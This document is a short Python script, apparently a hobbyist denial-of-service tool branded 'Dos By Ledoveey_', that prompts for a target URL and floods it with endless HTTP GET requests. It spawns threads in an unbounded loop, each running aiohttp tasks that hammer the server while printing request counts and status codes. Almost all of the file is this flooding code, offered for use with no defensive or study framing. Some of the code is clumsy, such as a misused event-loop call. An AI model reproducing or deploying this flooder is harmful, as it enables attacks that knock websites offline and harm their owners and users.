import asyncio
import os
import sys
import threading
import time

import aiohttp
from pystyle import *



headers = {
    "User-Agent": "Dos By Ledoveey_"
}

osystem = sys.platform

if osystem == "linux":
    os.system("clear")
else:
    os.system("cls")

time.sleep(2.5)

if osystem == "linux":
    os.system("clear")
else:
    os.system("cls")

time.sleep(1)
ascii: str = r'''   
{+} Created By Ledoveey_
_             _                                
| |    ___  __| | _____   _____  ___ _   _      
| |   / _ \/ _` |/ _ \ \ / / _ \/ _ \ | | |     
| |__|  __/ (_| | (_) \ V /  __/  __/ |_| |     
|_____\___|\__,_|\___/ \_/ \___|\___|\__, |____ 
                                     |___/_____|

 '''

banner = r"""
V1 """.replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

print(Colorate.Horizontal(Colors.red_to_blue, banner))
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0
url = input("{?} Enter URL-->")
time.sleep(1)
if url.startswith("http") or url.startswith("https"):
    pass
else:
    url = "http://" + url

    print(url)


async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
        async with session.get(url, headers=headers) as response:
            if response:
                set_end = int(time.time())
                set_final = start - set_end
                final = str(set_final).replace("-", "")

                if response.status == 200:
                    r += 1
                reqs.append(response.status)
                sys.stdout.write(
                    f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
            else:
                print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))


urls = []
urls.append(url)


async def main():
    tasks = []
    async with aiohttp.ClientSession() as session:
        for url in urls:
            tasks.append(fetch(session, url))
        DDoS = await asyncio.gather(*tasks)


def run():
    loop.run_forever(asyncio.run(main()))


if __name__ == '__main__':
    active = []
    ths = []
    while True:
        try:
            while True:
                th = threading.Thread(target=run)
                try:
                    th.start()
                    ths.append(th)
                    sys.stdout.flush()
                except RuntimeError:
                    pass
        except:
            pass